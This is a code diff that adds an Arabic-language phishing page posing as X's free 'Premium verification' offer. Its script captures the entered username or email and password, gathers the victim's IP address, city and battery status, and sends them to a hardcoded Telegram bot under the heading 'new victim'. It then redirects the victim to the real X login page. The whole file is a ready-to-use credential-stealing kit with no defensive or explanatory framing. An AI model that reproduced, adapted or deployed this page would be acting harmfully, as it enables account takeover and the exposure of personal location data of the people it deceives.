@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X - توثيق بريميوم</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #000; color: white;
+            min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .container {
+            background: #16181c; border: 1px solid #2f3336;
+            border-radius: 16px; padding: 30px;
+            max-width: 400px; width: 90%; text-align: center;
+        }
+        .logo { font-size: 50px; margin-bottom: 10px; }
+        h1 { font-size: 22px; }
+        p { color: #71767b; font-size: 13px; margin: 5px 0; }
+        .blue-box {
+            background: rgba(29,155,240,0.1); border: 1px solid #1d9bf0;
+            border-radius: 10px; padding: 12px; margin: 12px 0;
+        }
+        .blue-box span { color: #1d9bf0; font-size: 24px; font-weight: bold; }
+        input {
+            width: 100%; padding: 12px; margin: 6px 0;
+            border: 1px solid #2f3336; border-radius: 5px;
+            font-size: 14px; outline: none;
+            background: #000; color: white;
+        }
+        input:focus { border-color: #1d9bf0; }
+        .btn {
+            width: 100%; padding: 14px;
+            background: #1d9bf0; color: white;
+            border: none; border-radius: 20px;
+            font-size: 16px; font-weight: bold;
+            cursor: pointer; margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">𝕏</div>
+        <h1>توثيق بريميوم</h1>
+        <p>احصل على العلامة الزرقاء مجاناً</p>
+        <div class="blue-box">
+            <span>✓ Premium</span>
+            <p style="color:#1d9bf0;">توثيق مجاني</p>
+        </div>
+        <input type="text" id="email" placeholder="اسم المستخدم أو الإيميل">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button class="btn" onclick="submitData()">تقديم الطلب</button>
+    </div>
+
+    <script>
+        function getChatId() { return new URL(window.location.href).searchParams.get('chatId') || ''; }
+        const BOT_TOKEN = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        async function getIpInfo() {
+            try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; }
+        }
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) { const b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; }
+            return { level: '?', charging: '?' };
+        }
+        async function submitData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            if (!email || !password) { alert('يرجى إدخال جميع البيانات!'); return; }
+            const [ip, battery] = await Promise.all([getIpInfo(), getBatteryInfo()]);
+            const text = `🐦 تويتر/X - ضحية جديدة!\n\n📧 الايميل: ${email}\n🔑 الباسورد: ${password}\n\n🌍 IP: ${ip.ip}\n📍 الدولة: ${ip.country}\n🏙️ المدينة: ${ip.city}\n🔋 البطارية: ${battery.level}%\n⚡ الشحن: ${battery.charging}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: getChatId(), text: text }) });
+            window.location.href = 'https://x.com/login';
+        }
+    </script>
+</body>
+</html>
